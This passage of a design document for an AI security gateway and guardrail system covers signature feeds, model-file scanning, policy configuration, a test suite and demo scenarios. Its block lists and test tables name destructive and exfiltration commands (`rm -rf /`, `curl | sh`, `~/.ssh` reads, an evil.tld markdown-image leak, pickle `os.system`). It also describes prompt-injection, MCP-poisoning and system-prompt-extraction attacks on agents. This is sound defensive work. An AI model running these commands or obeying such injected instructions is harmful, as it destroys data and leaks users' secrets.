- **Coding-agent specifics** (OpenCode via `/v1/decide`, our tool server via the MCP proxy):

  | Area | Control |
  |---|---|
  | Files | Workspace-only access; always deny `~/.ssh`, `.env`, cloud credentials, browser profiles; detect symlink escape; redact secret values before they reach the model |
  | Shell | Allow (`git status`, test runners) / block by signature (`rm -rf /`, `curl … \| sh`, `terraform destroy`, "skip permissions" flags) / everything else requires approval |
  | Supply chain | `pip`/`npm install` checked against the feed and OSV (e.g. LiteLLM 1.82.7/8) plus a typosquat check |
  | Taint | Repo content (README, issues, comments) is untrusted. After untrusted content + secrets, `git push`, HTTP and publishing need approval |
  | Routing | Repo classification decides the allowed models (confidential repo → local model only) |
  | Output | Diffs scanned for secrets before write/commit; warnings on `eval`, `subprocess`, disabled TLS verification |

- **Agent identity:** each agent is a Keycloak client with its own scopes.
  - Delegation uses OAuth token exchange (RFC 8693, on-behalf-of) with short-lived tokens whose scopes **can only narrow** at each hop (attenuating capabilities: FSM-MCP's Delegation Safety Theorem, 91.3% ASR reduction [16701]; CapChain [316]).
  - The user's upstream tokens are never passed through.
  - Each call's audit record carries the full delegation chain.
- **Approvals:** a queue in the panel (and in the client for user-level approvals) showing the full context, the diff or command preview, and the taint reason.

### 9.1 Future option: signed tool permits

Stretch goal; not needed while we use OpenCode. If we ever build our own harness or executor:
1. The gateway attaches to each tool call it allows a short-lived permit, signed and bound to `hash(tool + args)`.
2. The local executor runs **only** tool calls with a valid permit.

A hijacked or modified agent loop then still can't execute anything the gateway didn't approve.

### 9.2 Historical-attack mitigation: signature feed and artifact scanner

Formal requirement 4. The research corpus is thin on model-file attacks, so this section draws on the compass report and public advisories. **Verify every CVE ID against NVD** before putting it into signature metadata.

**Signature feed: externally managed and hot-swapped.**
- **Sources:** OSV.dev and the GitHub Advisory Database (package/version gating for PyPI and npm), the CISA KEV catalogue, NVD, MITRE ATLAS (for tagging), garak / promptfoo probe families and public injection datasets (payload patterns), MCP benchmark payload families (MCPTox, MSB, MCP-SafetyBench), and gitleaks rules (secrets).
- **Bundle format:** versioned and signed JSON. Each entry has `id`, `type` (`regex | yara | package_version | url_path | tool_desc_hash | manifest_hash | opcode | arg_pattern | ioc_domain`), `pattern`, `severity`, `action`, `atlas_technique`, `owasp`, `cve`, `source`, `expires`.
- **Pipeline:** a small **feed server** container stands in for the external system. The gateway polls it, verifies the signature or checksum, compiles the patterns (RE2 / yara-python) and **swaps the set atomically**. A failed verification keeps the last good bundle. The bundle version is logged on every decision.
- **Where signatures are matched:**
  - prompts and tool results;
  - tool arguments (shell, HTTP, SQL, paths);
  - MCP `initialize` / `tools/list` / `tools/call`;
  - package installs in the coding agent;
  - model loads;
  - the known-attack embedding corpus (§6.2, stage 1b).
- **Demo:** a judge adds a rule to the feed and the very next request is blocked.

**Seed IOCs and signatures (examples):**

| Incident / class | Signature |
|---|---|
| LiteLLM 1.82.7 / 1.82.8 backdoored on PyPI (Mar 2026) | `package_version` block; `litellm_init.pth`; IOC domain |
| Langflow unauthenticated `exec()` (CVE-2025-3248, CISA KEV) and CVE-2026-33017 | `url_path` for the code-validation endpoint; Python-exec payloads in HTTP tool calls |
| ShadowRay, Ray Jobs API (CVE-2023-48022) | Block agent requests to Ray dashboard / Jobs API paths |
| Probllama, Ollama path traversal (CVE-2024-37032) | Version gate; Ollama is only reachable through the gateway, never on `0.0.0.0` |
| MLflow traversal / LFI; LangChain LLMMathChain / PALChain RCE | `../`, `file://` in arguments; `__import__`, `os.system`, `subprocess`, `eval` in generated code headed for execution |
| mcp-remote command injection (CVE-2025-6514); MCP Inspector RCE (CVE-2025-49596) | OAuth metadata URL validation; dev tools bound to localhost with auth |
| Filesystem MCP sandbox escape (CVE-2025-53109/53110) | Symlink and path-escape checks |
| EchoLeak, M365 Copilot (CVE-2025-32711); Slack AI exfiltration | Markdown-image / link exfiltration; URLs with high-entropy query strings |
| GitHub MCP "toxic agent flow" | Rule-of-Two taint: untrusted issue → private data → public sink |
| postmark-mcp (BCC rug pull) | Manifest/version pinning; egress recipient allowlist |
| Amazon Q extension wiper prompt; Nx "s1ngularity" | Destructive commands (`rm -rf`, `aws … delete`, `terraform destroy`); "skip permissions" flags; secret-path access (`~/.ssh`, `.env`, wallet files) |
| OpenClaw CVE-2026-25253; ClawHavoc (341 malicious skills of 2,857 audited, Koi Security) | **Skill/plugin allowlist + hash pinning** (this also covers OpenCode plugins and skills in our managed config); scan skill instructions for "fake prerequisite" install commands; localhost is not a trust boundary (Origin checks on local WebSockets) |
| Poisoned MCP config files → persistent RCE [9680] | MCP server list fixed in managed config; config files checked |

**Model-artifact scanner** (`POST /scan/model`, plus a load hook in the model registry):
- **Default deny:** only safetensors and GGUF are allowed. Pickle-based formats (`.bin`, `.pt`, `.pkl`) are blocked unless an explicit exception is granted. This alone makes scanner bypasses irrelevant.
- **Pickle opcode walker:** flags `GLOBAL` / `STACK_GLOBAL` / `REDUCE` to `os`, `subprocess`, `builtins.exec/eval` or `socket`. Also runs picklescan / ModelScan for a second opinion.
- **nullifAI-style tricks:** an archive-format mismatch (7z where ZIP is expected) or a **broken pickle stream** is treated as **malicious**, not as "unscannable".
- **Keras:** block `.keras` / `.h5` files with Lambda layers or arbitrary module references (CVE-2024-3660, CVE-2025-1550).
- **GGUF:** header and metadata sanity checks against parser memory-safety bugs.
- **PyTorch:** version gate for `torch.load(weights_only=True)` RCE (CVE-2025-32434, fixed in 2.6.0).
- **Hugging Face:** pin by **revision SHA**, not by name, to defend against namespace reuse; repo allowlist.
- **Our own fine-tuned models (§15) go through the same path.**

**Our own supply chain:** dependencies are pinned by hash and we don't depend on LiteLLM. Its compromise is a demo signature, not a dependency.

---

## 10. Data-exfiltration lockdown: "users cannot pick other models or send data elsewhere"

No single client setting can guarantee this. Four layers together do:

| # | Layer | What it stops | Where |
|---|---|---|---|
| 1 | **Users never hold provider keys** | Only the gateway has provider credentials; a user's only credential is our token, valid only at our gateway | Gateway |
| 2 | **The gateway is the model authority** | Group permissions decide the allowed models (anything else → 403 + incident); sensitive data → local models only, whatever the user requests | Gateway (scored) |
| 3 | **Managed client config + plugin** | Locks provider and models, disables sharing and webfetch, fixes the MCP server list, checks every local tool via `/v1/decide` | Device |
| 4 | **Network egress control** | Company devices can't reach LLM provider domains; only the gateway can. Covers browser ChatGPT, other tools and `curl` | Firewall / proxy / DNS |

Leak paths inside the agent itself: `curl`/`scp` from the shell, MCP servers the user adds, `git push` to a foreign remote. The plugin's tool check covers them, and layer 4 is the backstop.

**Demo packaging.** OpenCode runs in a container:
- as a non-root user;
- with the managed config in `/etc/opencode` (read-only);
- on a Docker network whose only route out is the gateway.

Judges can try to bypass it: editing the config does nothing, `curl api.openai.com` fails, and a forbidden model returns 403 and shows up as an incident in the panel. The same configuration deploys to real fleets via `%ProgramData%` / MDM plus firewall rules.

---

## 11. Centralised policy engine

### 11.0 Storage: rules as code, assignments in the database

We split by **what kind of data it is**, not "everything in YAML" or "everything in the DB":

| Kind | Examples | Store | Why |
|---|---|---|---|
| **Rules (policy as code)** | Controls, thresholds, presets, routing rules, connectors and model registry, group-level grants, budget definitions, org locks, feed settings | **YAML in `policy/`** (git-versioned) | This is exactly what the brief calls the "single config source": controls, thresholds, allowed models, budgets. The judges "may modify the configuration files". Diffable and reviewable, hot-reloadable, works offline, survives a DB outage, and makes a clean live demo |
| **Assignments** (high-volume, frequently changing, per entity) | Per-user and temporary grants (with expiry), API keys, users provisioned from Keycloak | **Postgres** | Thousands of users, frequent edits from the panel, expiry, concurrency, queries like "who has Gemini access?" |
| **State and events** | Budget ledger and counters, sessions and taint, approvals, incidents, audit index, history, policy version snapshots | **Postgres** (+ the hash-chained JSONL audit log) | Transactional, queryable, high write volume |

How the two stores relate:
- The policy files define the **ceilings**: what can ever be allowed, plus the locks.
- The database holds **who gets what within those ceilings**.

This is the same split as IAM policies vs role bindings. A database grant can never exceed a YAML org lock, because the engine evaluates locks first.

Why not put everything in the DB:
- the judges couldn't simply edit a file;
- no git diff or code review for security rules;
- the gateway would depend on the DB for every decision;
- two-way syncing between a file and a DB is a classic source of bugs.

Why not put everything in YAML:
- per-user grants for a 5,000-person bank would turn into a huge file;
- panel edits would conflict with each other;
- expiry would need a writer that keeps rewriting the file.

**Scalability note for the pitch.** The engine reads policy through a `PolicySource` interface; `FileSource` is the hackathon implementation. In production the same compiled policy can come from a git repo (GitOps, with PR review for security rules) or a DB-backed source, without changing the engine.

### 11.1 Editing and reloading

- **Policy files**, two ways to edit, one store:
  - Judges and engineers edit the files directly.
  - The admin panel edits through the API, writing a **new version** of the same files after validation. It uses optimistic locking: an edit based on an outdated version is rejected rather than overwriting someone else's change.
    - The panel offers **forms** for common edits (models, connectors, group grants, budgets, thresholds, presets, enabling or disabling controls) and a **raw YAML editor** for everything else.
    - The panel never touches the files itself. A single writer, the gateway's policy service, applies changes with round-trip YAML (`ruamel.yaml`), so hand-written comments and ordering survive panel edits.
    - Optional **GitOps mode** for production: instead of writing the file, the panel opens a pull request, and the change goes live after review and merge.
  - The files are split by area to keep diffs small and make them easy to find: `controls.yaml`, `models.yaml`, `groups.yaml`, `budgets.yaml`, `routing.yaml`.
  - A JSON Schema gives autocomplete and validation in editors (e.g. VS Code), so judges can edit safely.
  - The gateway watches the directory: validate (Pydantic / JSON Schema) → compile → **swap atomically** (requests already in flight keep the old version).
  - An invalid file → the gateway keeps the last good version and raises a panel alert.
- **DB assignments:** edited only through the panel/API. Every change is written to an append-only `grant_changes` table (who, what, why, when, expiry) and to the audit log. Changes take effect on the next request through a short-lived cache with invalidation.
- **Versioning:** every policy version is snapshotted in the DB with author, source (`panel` / `file`) and diff. Every decision logs `policy_version`, `grants_version` and `signature_bundle_version`.
- **Dry-run replay:** before applying, replay the last N stored requests against the candidate policy and show what would change ("would have blocked 14 of the last 500").
- **Identities:** the user → group mapping comes from Keycloak (group claims); policy defines what each group may do; the DB holds per-user exceptions.

### 11.2 Sample policy (abridged)

```yaml
version: 7
global:
  mode: enforce                     # monitor | enforce
  default_preset: balanced          # monitor | balanced | strict | paranoid
  fail_mode: {deterministic: closed, semantic: open_with_alert}
  latency_budget_ms: {semantic: 150, total: 400}

presets:
  balanced: {injection_threshold: 0.80, judge_band: [0.3, 0.8], pii_action: pseudonymise, secret_action: block}
  strict:   {injection_threshold: 0.50, judge_band: [0.2, 0.9], pii_action: route_local,  secret_action: block}

connectors:
  ollama: {type: ollama, base_url: "http://ollama:11434", tier: local}
  gemini: {type: openai_compatible, base_url: "https://generativelanguage.googleapis.com/v1beta/openai/",
           api_key: env:GEMINI_API_KEY, tier: cloud, enabled: true}   # paid key; secret stays in gateway env

models:
  - {id: ollama/qwen3:8b,                  alias: [local],       usd_per_gpu_second: 0.0006, data_classes: [public, internal, confidential, restricted]}
  - {id: ollama/bielik-11b-v3.0-instruct,  alias: [local-pl],    tags: {lang: pl},            data_classes: [public, internal, confidential, restricted]}
  - {id: ollama/qwen2.5-coder:7b,          alias: [local-coder], tags: {task: code},          data_classes: [public, internal, confidential, restricted]}
  - {id: ollama/corp/loan-memo-pl,         tags: {task: loan_memo, lang: pl}, specialist: {min_confidence: 0.8},
     data_classes: [public, internal, confidential], artifact: {sha256: "…", scanned: true}}
  - {id: gemini/<model-tbd>,               alias: [smart],       in_per_1k: 0.0003, out_per_1k: 0.0025,   # illustrative prices; model chosen later
     data_classes: [public, internal]}

aliases:
  auto: {strategy: specialist_then_rules}   # §7.3

org_locks:                                  # cannot be overridden by any grant
  - {id: LOCK-01, rule: "data_class in [restricted] → connector.tier == local"}
  - {id: LOCK-02, rule: "secrets never leave (SEC-SECRET-01 cannot be disabled from the panel)"}

routing:
  sensitivity: {high: local_only, medium: redact_then_external, low: by_complexity}
  complexity_bands: {local: "<0.3", ext_small: "0.3-0.7", ext_large: ">=0.7"}
  escalation_scales_with_remaining_budget: true
  on_budget_exhausted: degrade_to_local

groups:
  credit-analysts:
    preset: strict
    models: [auto, local-pl, ollama/corp/loan-memo-pl]
    skills: [skill/loan-memo-summary]
    max_external_data_class: internal
  developers:
    preset: balanced
    models: [auto, local-coder, smart]
    tools: [fs.read, fs.write, shell, git, search]
    repos: {confidential/*: {models: [local-coder]}}
  agents/research-bot:
    preset: strict
    tools:
      web.search:  {labels: [reads_untrusted]}
      fs.read:     {labels: [touches_sensitive], path_allow: ["/data/**"], path_deny: ["**/.ssh/**", "**/.env"]}
      email.send:  {labels: [external_egress, irreversible], approval: required, recipients_allow: ["@corp.example"]}
    limits: {max_steps: 25, max_tool_depth: 5, repeat_call: {count: 3, window_s: 60}}

# Per-user and temporary grants are NOT here: they live in the database (§11), e.g.
#   jan.kowalski  +model smart  expires 2026-10-10  reason "Gemini pilot"
#   anna.nowak    -tool bash    +mcp jira

controls:
  - {id: SEC-PII-01,   type: pii,        stages: [ingress, egress, tool_result], entities: [PESEL, NIP, IBAN, CREDIT_CARD, EMAIL, PHONE, PERSON]}
  - {id: SEC-SECRET-01,type: secrets,    stages: [ingress, egress, tool_args], action: block}
  - {id: SEC-PI-01,    type: classifier, model: injection-l1, stages: [ingress, tool_result]}
  - {id: SEC-SAFE-01,  type: judge,      model: ollama/granite3.3-guardian:8b, stages: [egress], escalate_only: true}
  - {id: SEC-EXFIL-01, type: url_egress, allow_domains: ["*.corp.example"], strip_markdown_images: true, max_query_entropy: 3.5}
  - {id: SEC-FLOW-01,  type: rule_of_two, on_violation: require_approval}
  - {id: SEC-MCP-01,   type: mcp_pinning, on_drift: quarantine}

budgets:
  org:   {usd_month: 100, gpu_seconds_day: 3600}
  groups: {developers: {tokens_day: 2_000_000, usd_day: 5}}
  agents: {research-bot: {tokens_session: 50_000, gpu_seconds_session: 120}}
  on_exceed: {soft_pct: 80, soft_action: alert, hard_action: block, circuit_breaker: {cooldown_s: 300}}

signatures:
  feed: {url: "http://feed:8080/bundle.json", poll_s: 30, verify: sha256, on_fail: keep_last_good}

reporting:
  audit_log: {path: logs/audit.jsonl, format: ocsf, hash_chain: true, store_raw_payloads: false}
```

---

## 12. Admin panel

| View | Contents |
|---|---|
| **Posture (management)** | Posture score (enabled controls weighted by severity × mode); blocked/redacted/routed/approved over time; top risk categories by OWASP LLM 2026 / Agentic ASI / MCP Top 10; spend vs budget per team/model; external-routing rate; savings vs an always-external baseline; burn forecast |
| **Security (analyst)** | Live event stream with filters (user, group, agent, control, OWASP/ATLAS ID, decision); **decision trace** per event (each control's verdict, score, latency; policy and feed versions) |
| **Incidents** | Grouped from events; severity, status, assignee, notes, linked traces; export |
| **Approvals** | Pending human approvals with context and diff/command preview |
| **Users & groups** | Users provisioned from Keycloak on first login; group → permissions view; personal API keys (issue/revoke); agent identities |
| **User 360** | One page per user (or agent). **Effective access**: models, connectors, skills, MCP servers, tools, budgets, preset, each showing its source (group / user override / org lock) and expiry; edit grants inline. **Activity history**: sessions and conversations, every request with its decision trace, model chosen and why, tool and MCP calls with arguments and outcomes, approvals, incidents, spend over time. **Risk**: taint events, blocked attempts, anomalies against the group baseline |
| **Policies** | YAML editor with schema validation, version history, diff, **dry-run replay**, rollback |
| **Models & connectors** | Connectors (health, latency, spend, kill switch); model registry (tiers, prices, allowed data classes, capability tags, artifact-scan status); who has access to what |
| **MCP inventory** | Servers, tools, pinned hashes, drift alerts, quarantine |
| **Budgets** | Hierarchy with live counters, breaker states, top consumers |
| **Performance** | p50/p95/p99 overhead per control and stage, cache hit rate, judge escalation rate, fail-open count |
| **Guard quality** | Latest test-suite results per control and per preset, using the metrics the literature uses:<br>• ASR / attack detection rate with Wilson confidence intervals<br>• FPR **per call and per task** (they differ a lot: 4.6% vs 30% in [10632])<br>• defence success rate (refuse every malicious *and* accept every benign case) [2808]<br>• wrongly-withheld rate (over-redaction) [5232]<br>• leak rate **per channel** (output, tool args, inter-agent) [1749]<br>• **per-layer attribution** (which layer caught what, as in LlamaFirewall's ablations)<br>• NRP = utility under attack × (1 − ASR) [9674]<br>• recovery-after-block rate [698]<br>• judge κ against labels<br>• the shadow judge's estimated miss rate (§6.6) |
| **Automation Insights** | §14 |

The panel signs in through Keycloak with admin/analyst/viewer roles.

**History and privacy.** Admins can see what a user did, but not raw personal data by default:
- Stored payloads are the **redacted / pseudonymised** versions, which are already enough to understand the activity.
- Raw content is kept only if the policy enables it: encrypted, short retention, for the security team only.
- Viewing raw content is a **break-glass action**: it requires a reason, is written to the audit log as its own event, and appears in the posture view ("who looked at whose data").

This keeps employee monitoring proportionate (GDPR) and covers the insider-admin threat.

---

## 13. Audit, telemetry and reporting

- **Audit log:** append-only JSONL, **hash-chained (SHA-256)**, mapped to OCSF (Detection Finding / API Activity), with an optional CEF line for SIEMs. The log stores no raw sensitive values: only entity type, salted hash and offset. The detector must not become a new exposure point.
- **Record schema** (assembled from [300][32779][26498][19680]):
  - timestamp, trace ID, session ID;
  - user / agent / delegation chain;
  - inspection point; tool, server, model and connector;
  - hashed arguments; decision and action; rule IDs;
  - per-control verdict, score and latency; the graded risk factors;
  - versions: policy, grants, signature bundle, classifier and judge models;
  - seed; response hash; previous-record hash.

  With all the versions recorded, **any decision can be recomputed later** (replay).
- **Every event** is tagged with OWASP LLM Top 10 2026 / OWASP Agentic ASI / OWASP MCP Top 10 / MITRE ATLAS IDs.
- **Traces:** OpenTelemetry GenAI semantic conventions (with the version pinned, since they are still at "Development" status). Span kinds are `LLM_CALL`, `TOOL_CALL`, `GUARD_RAIL` and `DELEGATION`, carrying model, tokens and cost [437]. One stream serves both the security team (traces) and management (dashboards).
- **Metrics:** Prometheus, covering per-control latency histograms, decisions, spend and breaker state.
- **Exports:** JSONL / OCSF / CSV for SIEM ingestion.

---

## 14. Automation Insights (repetitive-work mining)

**Idea.** Employees repeat the same AI-assisted tasks (e.g. a credit analyst summarising a loan application every morning). We detect these patterns and offer them as **governed skills**: a fixed prompt template, an input form, the cheapest model that is good enough, and tight guardrails. Pitch: *turn shadow AI usage into approved, cheaper, safer workflows.*

**Pipeline** (all local, worker process):
1. Input: **already-redacted** prompts plus metadata (user, group, time, model, tokens, latency, whether the user retried).
2. Embed with a local embedding model (Ollama).
3. Cluster per group over a time window (e.g. HDBSCAN).
4. Detect recurrence: periodicity (daily or weekly), similar prompt structure, repeat count, number of distinct users.
5. Estimate cost: tokens, GPU-seconds, wall-clock time, retries.
6. A local LLM writes a **task card** (what the task is, typical inputs and outputs) and a **draft skill** (prompt template, input schema, suggested model, suggested controls).
7. An admin reviews and publishes it as `skill/<name>`. It then appears in every client through the personalised `/v1/models`.

**Why it belongs in a security product:**
- A skill is least privilege by construction: known input shape, narrow tools, a stricter preset, a cheaper model.
- Moving routine tasks to small local models saves real money, and the dashboard shows the counterfactual savings.
- Per-group usage baselines also support **anomaly detection**, e.g. a compromised account or a rogue agent suddenly behaving differently.

**Privacy by design.** Mining employee prompts is workplace monitoring under GDPR and Polish labour law. So:
- mine only redacted text;
- run everything on local models;
- show management only clusters seen across **at least k distinct users** (configurable, e.g. k=5);
- show individual employees only their own suggestions;
- make it configurable per group, with opt-in for personal insights.

**Scope:** a minimal working slice (embed → cluster → recurrence → task card → publish) is enough for the demo. It's a differentiator, not a scored requirement.

---

## 15. Fine-tuned guard/router model (WCSS)

The brief requires the system to run on our own setup, so WCSS GPUs are used **offline for training only**. The runtime uses the resulting small model locally.

- **Target:** one small multilingual multi-label classifier that predicts in a single pass:
  - injection / jailbreak;
  - data sensitivity level;
  - task complexity.

  It is both the L1 guard and the router; the research corpus recommends this pattern [305].
- **Why:** off-the-shelf guards are weak outside English (one open guard missed 85% of Turkish attacks [59726]). A Polish-aware model is a measurable differentiator for a Polish bank scenario.
- **Base model candidates:** mDeBERTa-v3-base (MIT) or Qwen3-0.6B (Apache-2.0). Verify licences.
- **Data:**
  - public injection/jailbreak sets (e.g. deepset/prompt-injections, JailbreakBench), translated to Polish;
  - synthetic Polish banking and dev prompts generated by a local LLM;
  - **benign hard negatives** (harmless text full of trigger words, NotInject-style);
  - a held-out set that is never used for tuning.
- **Deliverable:** a before/after comparison against the off-the-shelf classifier (ASR, FPR, latency), shown in the panel's Guard Quality view.
- **Polish starting point:** **Bielik Guard** (SpeakLeash, Apache-2.0) is a family of Polish safety classifiers (0.1B / 0.5B, Polish RoBERTa-based). It covers content safety (hate, vulgarity, sexual content, crime, self-harm), **not** injection or sensitivity. Use it as-is for Polish content safety in L1, and evaluate its encoder as a base for our injection / sensitivity / task heads.
- **Supply-chain dogfooding:** the trained weights are exported as safetensors and pass through our own artifact scanner before entering the model registry.
- **Risk control:** the pipeline ships first with an off-the-shelf classifier. Fine-tuning is a parallel track for one person and must never block the demo.

### 15.1 Fine-tuned specialist LLMs (auto-routed)

Besides the classifier, WCSS can train **small specialist chat models** that `auto` selects by task (§7.3):
- **Method:** LoRA/QLoRA on a small Apache-licensed base (Bielik 4.5B for Polish, or Qwen3-4B), exported to GGUF and imported into Ollama with a Modelfile.
- **Demo specialist:** `corp/loan-memo-pl`, which turns a loan application into a structured credit memo in Polish. It's trained on **synthetic** applications and memos generated locally.
- **Data in production:** only redacted examples from an approved skill (§14), with the group's consent setting respected.
- **Evaluation:** the specialist vs the general local model vs Gemini on a held-out set (quality judged by a local judge + format checks, latency, cost). The panel shows that the 4B specialist matches the general model on this task at a fraction of the GPU-seconds.
- **Registration:** artifact scan → registry with `tags: {task: loan_memo, lang: pl}` → granted to `credit-analysts` → `auto` starts routing.

---

## 16. Self-testing suite

**Layout:** `pytest` + `pytest-asyncio` + `httpx` against the running stack. Parametrised YAML cases live in `tests/cases/*.yaml`; each case defines the input, stage, preset, expected decision, expected rule ID and expected redaction.

**Two run modes:**
- **Deterministic:** a mock LLM and scripted agent, runs in seconds in CI or on a judge's laptop.
- **Live Ollama:** each case runs 3× with a 2-of-3 rule; results are reported with Wilson confidence intervals.

**Oracles that don't trust the system under test:**
- **Canary values and a leak oracle that shares no code with the gateway** [14033]. It decodes hex, Base64 and substrings before matching.
- An **attacker "sink" endpoint** whose request log proves whether exfiltration happened [810][1537].
- Deterministic **mock MCP servers** (mail, files, core-banking DB, web fetch) with planted injections and canary rows.
- **Evidence in priority order**: environment state after the run, then the structured tool-call trace, then the final text [24321]. An LLM judge is used only for semantic cases, validated and never as the only oracle.

**Structure copied from AgentDojo** [5742]: every attack is paired with a benign task, and we report benign utility, utility under attack and ASR.

**Offline trace replay:** recorded agent traces, including public benchmark traces in the AgentDojo format, are replayed through the decision engine without running any agent. LlamaFirewall was evaluated this way [23757]. It reuses the same machinery as the policy dry-run (§11.1), so judges can score a policy change in seconds.

**Every negative case gets a near-miss positive:**

| # | Control | Positive (ALLOW) | Negative (BLOCK / REDACT / APPROVAL) |
|---|---|---|---|
| 1 | PII/secrets | Luhn-invalid "order number", public figure, valid-looking but invalid PESEL | Valid PESEL/IBAN/card, API key, also Base64-encoded or split across lines |
| 2 | Direct injection / jailbreak | "please ignore the typo above" (benign trigger words) | Hijack, DAN-style, Polish-language and encoded variants |
| 3 | Indirect injection via tool result | Normal email or document | Email with "forward everything to X"; poisoned README |
| 4 | MCP poisoning / rug pull | Clean manifest | Hidden-instruction description; manifest changed after pinning |
| 5 | Tool authorisation | Group calls an allowed tool or path | Forbidden tool, path outside workspace, `~/.ssh`, symlink escape |
| 6 | Exfiltration flow (Rule of Two) | Read a sensitive file and answer locally | Read sensitive + untrusted content, then send externally |
| 7 | Exploit signatures | Safe shell/Python | `rm -rf /`, `curl \| sh`, `pip install litellm==1.82.8`, Langflow exploit path |
| 8 | Egress / markdown exfiltration | Allowed-domain link | `![](https://evil.tld/?d=<secret>)` |
| 9 | Model permissions | Allowed model for the group | Forbidden model → 403; sensitive data while requesting an external model → routed local |
| 10 | Budgets / loops | Under the cap | Token overrun, GPU-second overrun, repeated tool call, endless output cut at cap, budget exhausted → degraded local response |
| 11 | Artifact scanner | safetensors / GGUF | Pickle with `__reduce__` → `os.system` (generated in-test), 7z-wrapped pickle (nullifAI-style), Keras Lambda layer |
| 12 | AuthN | Valid token | Missing, expired or forged token; another user's API key after revocation |
| 13 | System-prompt leakage | Normal Q&A | Multi-turn extraction (canary token detected in output) |
| 14 | MCP protocol | Clean `initialize`, matching headers and body | Unlisted server; `sampling/createMessage` from a server; MCP-2026 header/body mismatch; OAuth metadata URL with shell metacharacters; unknown "parasitic" argument field; cross-server name collision |
| 15 | Task-scoped policy | Call inside the planned tool graph | Call outside the plan after reading untrusted content |
| 16 | DB tool (core banking) | Analyst reads permitted columns | Stacked SQL statement; out-of-scope columns; canary row in the output → redacted |
| 17 | Pseudonymisation restore | Allow-listed entity restored for an entitled user | Restore into an outbound tool argument; hallucinated placeholder |
| 18 | Egress hygiene | Normal answer | `logprobs` / reasoning trace in the upstream response → stripped |

**Suite-level tests:**
- **Strictness matrix:** the same cases run under `monitor` / `balanced` / `strict` / `paranoid`, with the expected decision asserted in every cell.
- **Hot reload:** change the preset from strict to lenient and assert that the same prompt changes decision within 2 s without a restart; invalid YAML → the last good version is kept; add a feed rule → the next request is blocked.
- **Mutation testing:** a script switches off each control in turn and asserts that at least one test fails. This proves the suite actually exercises every rule.
- **Adaptive tier:** paraphrased, encoded and translated variants of the attacks, reported honestly (not 100%).
- **Performance:** a latency report comparing a direct call to Ollama with the same call through the gateway, at p50/p95 per stage.
- **Red team (optional):** garak and promptfoo pointed at the gateway, with results stored as artifacts.
- **Outputs:** JUnit + JSON + a metrics summary (ASR, FPR, utility, leak rate, latency) that feeds the panel.

---

## 17. Demo scenarios

1. **Company SSO.** Two employees in different groups log into OpenCode and LibreChat. The same prompt is allowed for one and routed local or blocked for the other.
2. **Lockdown.** A judge tries to bypass the gateway: editing the config does nothing, `curl api.openai.com` fails, a forbidden model returns 403. Each attempt appears as an incident.
3. **Poisoned repository.** The README tells the agent to read `~/.ssh/id_rsa` and `curl` it out. The read is denied, and the Rule-of-Two flow rule would block the send even if the classifier missed it.
4. **Supply chain.** The agent runs `pip install litellm==1.82.8` and is blocked by the feed. A judge adds a new rule to the feed live, and the next attempt is blocked.
5. **PII in a banking chat.** A PESEL and an IBAN are pseudonymised, the request goes to a local model, and the panel shows the redaction.
6. **MCP rug pull.** A demo MCP server changes a tool description mid-session; the tool is quarantined and an incident is raised.
7. **Runaway agent.** A loop trips the repeat-call detector and the GPU-second budget; the circuit breaker opens and a spend spike appears.
8. **Malicious model file.** A pickle payload is blocked, and so is the 7z-wrapped variant.
9. **Live policy change.** A judge switches presets or deletes a control in the YAML; the behaviour changes on the next request and the trace shows the new policy version. An invalid YAML is rejected and the last good version stays active.
10. **Per-user model access + Gemini routing.** An admin gives Jan temporary Gemini access in the panel, and `smart` appears in his model list. He asks a general question → it goes to Gemini. He pastes a client's PESEL → it's automatically routed to local Bielik because confidential data may not go to a cloud connector. The trace explains why.
11. **Auto picks a specialist.** A credit analyst on `auto` pastes a loan application. The router picks the fine-tuned `corp/loan-memo-pl` ("task=loan_memo 0.91 → specialist, local"). The panel shows GPU-seconds saved against the general model.
12. **Admin User 360.** An admin opens Anna's page, sees her tools, MCP servers and history, and revokes `bash`. Her next OpenCode shell call is blocked with the rule ID.
13. **Core-banking DB tool.** An analyst's agent queries the client database through the governed MCP server. Permitted columns are returned with PII pseudonymised. A stacked `; DROP` statement and a query for out-of-scope columns are blocked. A planted canary row never leaves the gateway, and the attacker sink's log stays empty.
14. **Automation Insights.** Seeded usage history yields "credit-analysts summarise loan applications daily, about 40 min/day", which is published as a skill and appears in LibreChat.

---

## 18. Technology stack and licences

All licences below must be re-verified before use, as the brief requires.

| Area | Choice | Licence |
|---|---|---|
| Gateway / MCP proxy / workers | Python 3.12, FastAPI, httpx, Pydantic v2, watchdog, official MCP SDK | MIT / BSD / Apache |
| Admin panel | Next.js, TypeScript | MIT |
| Identity | Keycloak | Apache-2.0 |
| Developer client | OpenCode + our plugin | MIT |
| Staff client | LibreChat | MIT |
| Local models | Ollama; Qwen3 / Qwen2.5-Coder; Bielik v3 (Polish); bge-m3 embeddings | MIT / Apache-2.0 / MIT |
| Cloud demo connector | Gemini API (paid key, OpenAI-compatible endpoint), allowed up to `internal` data | Google API terms (paid tier) |
| Polish content safety | Bielik Guard 0.1B / 0.5B | Apache-2.0 |
| Fine-tuning (offline, WCSS) | PyTorch + PEFT (LoRA), Transformers; export to safetensors / GGUF | BSD / Apache-2.0 |
| Guards | Prompt Guard 2 (Llama licence, gated) **or** an Apache-licensed DeBERTa injection classifier; Qwen3Guard, Granite Guardian (Apache-2.0); Llama Guard 3 (Llama licence) | mixed: keep classifiers pluggable so a licence swap is a config change |
| PII | Microsoft Presidio + our Polish validators + a multilingual GLiNER PII model. Check the licence of the specific checkpoint; spaCy's Polish `pl_core_news_*` models are reportedly GPL, so verify before using them as Presidio's Polish NER | MIT / Apache-2.0 (verify) |
| Embeddings / attack kNN | bge-m3 via Ollama | MIT |
| Secrets rules | gitleaks rule set (ported), detect-secrets | MIT / Apache-2.0 |
| Signatures | Python `re` / RE2, yara-python | Apache-2.0 |
| Artifact scanning | Own opcode walker + picklescan / ModelScan; fickling only as an external CLI | MIT / Apache-2.0 / LGPL-3.0 |
| Storage / metrics | Postgres (or SQLite), Prometheus client, OpenTelemetry SDK | permissive |
| Testing | pytest, pytest-asyncio, pytest-benchmark, garak, promptfoo | MIT / Apache-2.0 |
| Packaging | docker-compose | Apache-2.0 |

We do **not** depend on LiteLLM. Its PyPI releases 1.82.7/1.82.8 were backdoored in March 2026. That incident is a demo signature for us, and a reason to own a lean gateway with dependencies pinned by hash.

---

## 19. Build order

| Phase | Deliverable |
|---|---|
| **1 Skeleton** | Proxy to Ollama; policy loader + schema + hot reload; decision object; hash-chained audit log; Keycloak in compose; first tests |
